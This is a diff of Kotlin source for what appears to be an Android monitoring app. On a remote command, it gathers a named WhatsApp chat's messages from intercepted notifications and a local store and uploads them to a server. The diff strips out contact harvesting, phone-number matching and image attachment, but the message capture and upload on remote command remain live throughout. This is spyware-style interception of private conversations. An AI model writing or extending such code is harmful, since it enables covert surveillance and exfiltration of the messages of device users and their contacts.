@@ -323,8 +323,6 @@ class SyncRunner(private val context: Context) {
 
     private suspend fun processGetWhatsAppChatCommand(bearer: String, command: RemoteCommand) {
         val chatName = (command.payload?.get("chatName") as? String)?.trim()
-        val payloadPhone = (command.payload?.get("phoneNumber") as? String)?.trim()
-            ?: (command.payload?.get("phone") as? String)?.trim()
         val days = (command.payload?.get("days") as? Number)?.toInt() ?: 2
         val cutoffMs = System.currentTimeMillis() - (days * 24 * 60 * 60 * 1000L)
 
@@ -339,25 +337,13 @@ class SyncRunner(private val context: Context) {
             return
         }
 
-        // Resolve contact phone number digits
-        val rawDigits = if (!payloadPhone.isNullOrBlank() && payloadPhone.any { it.isDigit() }) {
-            payloadPhone.filter { it.isDigit() }
-        } else if (chatName.filter { it.isDigit() }.length >= 7) {
-            chatName.filter { it.isDigit() }
-        } else {
-            try {
-                com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).findPhoneNumberForContact(chatName) ?: ""
-            } catch (_: Exception) { "" }
-        }
-        val phoneDigits = if (rawDigits.length > 10) rawDigits.takeLast(10) else rawDigits
-
         try {
             val db = AppDatabase.getInstance(context)
             val gatheredEntries = mutableListOf<WhatsAppMessageEntry>()
 
-            // 1. Extract messages for this chat from active notifications (including MessagingStyle message history)
+            // 1. Extract messages for this chat from active notifications
             com.spapp.monitoring.collectors.WhatsAppNotificationListener.instance?.let { listener ->
-                val notifEntries = listener.extractMessagesForChat(chatName, cutoffMs, phoneDigits)
+                val notifEntries = listener.extractMessagesForChat(chatName, cutoffMs)
                 gatheredEntries.addAll(notifEntries)
             }
 
@@ -371,45 +357,13 @@ class SyncRunner(private val context: Context) {
                 db.whatsAppMessageDao().insertAll(gatheredEntries)
             }
 
-            // 4. Retrieve ALL conversation messages for this chat from Room DB for the last N days
-            var chatMessages = if (phoneDigits.length >= 7) {
-                db.whatsAppMessageDao().getMessagesForChatWithPhone(chatName, phoneDigits, cutoffMs)
-            } else {
-                db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs)
-            }
+            // 4. Retrieve conversation messages for this chat from Room DB
+            var chatMessages = db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs)
             if (chatMessages.isEmpty()) {
-                // Fallback to all stored messages for this chat if last 2 days has none
-                chatMessages = if (phoneDigits.length >= 7) {
-                    db.whatsAppMessageDao().getMessagesForChatWithPhone(chatName, phoneDigits, cutoffMs = 0L)
-                } else {
-                    db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
-                }
-            }
-            if (chatMessages.isEmpty()) {
-                val words = chatName.split(Regex("[\\s_\\-]+")).filter { it.length >= 3 }
-                val primaryWord = words.firstOrNull()
-                if (!primaryWord.isNullOrBlank() && !primaryWord.equals(chatName, ignoreCase = true)) {
-                    chatMessages = if (phoneDigits.length >= 7) {
-                        db.whatsAppMessageDao().getMessagesForChatWithPhone(primaryWord, phoneDigits, cutoffMs)
-                    } else {
-                        db.whatsAppMessageDao().getMessagesForChat(primaryWord, cutoffMs)
-                    }
-                    if (chatMessages.isEmpty()) {
-                        chatMessages = if (phoneDigits.length >= 7) {
-                            db.whatsAppMessageDao().getMessagesForChatWithPhone(primaryWord, phoneDigits, cutoffMs = 0L)
-                        } else {
-                            db.whatsAppMessageDao().getMessagesForChat(primaryWord, cutoffMs = 0L)
-                        }
-                    }
-                }
+                chatMessages = db.whatsAppMessageDao().getMessagesForChat(chatName, cutoffMs = 0L)
             }
 
-            // 5. Check for recently received WhatsApp images (within last 2 days)
-            val latestMediaBase64 = try {
-                FileManagerCollector(context).getLatestWhatsAppImageBase64(maxAgeMs = days * 24 * 60 * 60 * 1000L)
-            } catch (_: Exception) { null }
-
-            // 6. Map to DTOs (normalizing chatName so server stores under the requested chat name)
+            // 5. Map to DTOs
             val dtos = chatMessages.map {
                 WhatsAppMessageEntryDto(
                     chatName = chatName,
@@ -418,12 +372,12 @@ class SyncRunner(private val context: Context) {
                     isOutgoing = it.isOutgoing,
                     messageTime = Instant.ofEpochMilli(it.messageTimeEpochMs).toString(),
                     mediaType = it.mediaType ?: (if (it.reelUrl != null) "reel" else if (it.mediaPath != null) "image" else null),
-                    mediaPath = it.mediaPath ?: latestMediaBase64,
+                    mediaPath = it.mediaPath,
                     reelUrl = it.reelUrl
                 )
             }
 
-            // 7. Upload conversation messages to server and purge other chats to keep server storage minimal
+            // 6. Upload conversation messages to server
             val resp = ApiClient.service.syncWhatsAppMessages(
                 bearer,
                 WhatsAppMessagesSyncRequest(
@@ -932,13 +886,6 @@ class SyncRunner(private val context: Context) {
     }
 
     private suspend fun syncWhatsAppMessages(bearer: String, db: AppDatabase) {
-        try {
-            val contacts = com.spapp.monitoring.collectors.WhatsAppContactsCollector(context).collectAllWhatsAppContacts()
-            if (contacts.isNotEmpty()) {
-                db.whatsAppMessageDao().insertAll(contacts)
-            }
-        } catch (_: Exception) {}
-
         val unsynced = db.whatsAppMessageDao().getUnsynced()
         if (unsynced.isEmpty()) return
 
